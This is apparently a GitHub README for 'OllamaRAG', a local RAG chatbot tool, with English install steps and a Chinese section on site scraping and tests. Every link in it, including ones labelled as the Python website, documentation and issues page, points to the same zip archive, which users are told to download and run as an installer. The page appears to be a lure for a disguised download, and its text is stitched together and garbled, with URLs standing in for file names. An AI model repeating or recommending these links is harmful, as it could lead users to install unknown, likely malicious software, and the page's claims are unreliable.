# 🤖 OllamaRAG - Build Your Conversational AI Assistant Easily

[![Download OllamaRAG](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)

## 🚀 Getting Started

OllamaRAG is a complete framework that allows you to create a conversational AI assistant. This tool learns from websites, making it easy for you to get answers based on online information. It combines powerful technology like Ollama and LangChain with a simple chat interface made with Streamlit.

### 🌟 Features

- **Local-First Approach**: Work without needing constant internet access.
- **User-Friendly Interface**: Easy-to-navigate chat setup.
- **Powerful Search**: Retrieve relevant information from various websites.
- **Customizable**: Tailor the assistant to fit your needs.

## 📋 System Requirements

To run OllamaRAG effectively, ensure your system meets the following requirements:

- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
- **RAM**: At least 8 GB.
- **Storage**: Minimum of 1 GB free disk space for installation.
- **Python**: Version 3.7 or later installed.

If you need help installing Python, you can visit the [official Python website](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip) for instructions.

## 📥 Download & Install

To get started with OllamaRAG, follow these steps:

1. **Visit the Releases Page**: Click on the link below to access the release files.
   [Download OllamaRAG](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)

2. **Choose the Correct File**: Look for the latest version. You will see files like "https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip" for Windows or "https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip" for macOS and Linux.

3. **Download the File**: Click on the file name to begin downloading it to your computer.

4. **Run the Installer**: 
   - For Windows: Double-click on the downloaded `.exe` file and follow the prompts.
   - For macOS: Open the `https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip` file, and drag the OllamaRAG app to your Applications folder.
   - For Linux: Extract the `https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip` file and run the installer using the terminal.

5. **Open the Application**: After installation, launch OllamaRAG from your applications or programs menu.

6. **Follow the On-Screen Instructions**: The application will guide you through the initial setup.

## 🔍 How to Use

Once you have OllamaRAG running, you can start interacting with your AI assistant. Here’s how:

1. **Input Your Queries**: Type questions or topics you want to know about in the chat interface.
   
2. **Watch It Work**: The assistant will search online and provide answers based on the information it finds.

3. **Iterate**: Refine your questions for better responses. You can ask follow-up questions to dig deeper.

### 📥 在页面中采集站点

聊天页顶部的「站点采集」面板提供了完整的采集入口，不再需要先手动运行 `scrape.py`：

1. 点击 **开始采集**：从 `config.py` 的 `START_URL` 出发，只抓取同域链接，最多 200 页，
   跳过 `.pdf` / `.jpg` / `.png` / `.zip` / `.svg` 等资源，单页请求超时 10 秒。
2. 采集过程中实时显示 **已访问页数** 与 **当前 URL**，可随时点击 **停止采集**；
   停止后已抓到的页面会保留。
3. 点击 **继续采集** 会从断点继续：已访问集合、待访问队列和成功/失败清单都会延续，
   已抓过的页面不会重复抓取或重复计数。
4. 一轮采集结束（自然完成或用户停止）后，成功页会按 `ingest.py` 读取的 JSON 列表格式
   写入 `SCRAPED_DATA_PATH`，页面显示成功数、失败数、总访问数，并逐条列出失败页的
   URL 与原因。
5. 若 `START_URL` 不可达或整轮没有任何成功页，页面会明确提示，并且不会覆盖已有的
   `SCRAPED_DATA_PATH` 文件。
6. 采集结束后可在同一页面点击 **将抓取结果入库到向量库** 执行入库；入库异常会在页面上
   显示具体原因。

命令行方式仍然可用：

```bash
python scrape.py   # 采集站点内容
python ingest.py   # 写入向量库
```

### ✅ 运行测试

```bash
python -m pytest tests/ -q
```

测试使用本地伪造的 HTTP 响应与临时文件，不依赖真实外网。


## 📚 Additional Resources

For further assistance and detailed documentation, feel free to check these resources:

- [Python Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)
- [Streamlit Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)
- [LangChain Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)
- [Ollama Documentation](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip)

## 🤝 Community Support

If you encounter any issues, consider reaching out for help. You can:

- Search for solutions in forums related to conversational AI.
- Ask questions in online communities like Reddit or Stack Overflow.
- Connect with other users via GitHub Discussions in this repository.

## 🛠️ Contributions

OllamaRAG is an open-source project. Contributions are welcome. Whether it’s reporting bugs, suggesting features, or improving documentation, your input is valuable.

### 📧 Contact

For questions or feedback, feel free to reach out via the repository's [issues page](https://raw.githubusercontent.com/roberto729a/OllamaRAG/main/Kidderminster/RAG_Ollama_v2.1.zip).

## 📝 License

OllamaRAG is released under the MIT License. You are free to use and modify it as per the license terms.

---

By following this guide, you should now have OllamaRAG installed and be ready to build your own conversational AI assistant. Enjoy exploring the possibilities!